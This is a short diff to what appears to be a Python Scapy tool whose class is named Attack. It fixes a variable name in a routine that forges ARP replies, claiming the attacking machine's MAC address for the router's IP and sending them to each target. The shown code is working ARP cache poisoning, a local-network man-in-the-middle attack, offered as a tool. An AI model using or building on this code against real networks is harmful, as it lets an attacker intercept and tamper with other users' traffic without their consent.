@@ -84,7 +84,7 @@ class Attack(object):
 			arp2 = Ether() / ARP()
 			arp2[Ether].src = my_Mac #attacking MAC address
 			arp2[ARP].hwsrc = my_Mac #attacking MAC address
-			arp2[ARP].psrc = self.router #IP to Spoof
+			arp2[ARP].psrc = self.routerip #IP to Spoof
 			arp2[ARP].hwdst = self.targets[i].MAC
 			arp2[ARP].pdst = self.targets[i].IP
 			sendp(arp2, iface = self.interface)
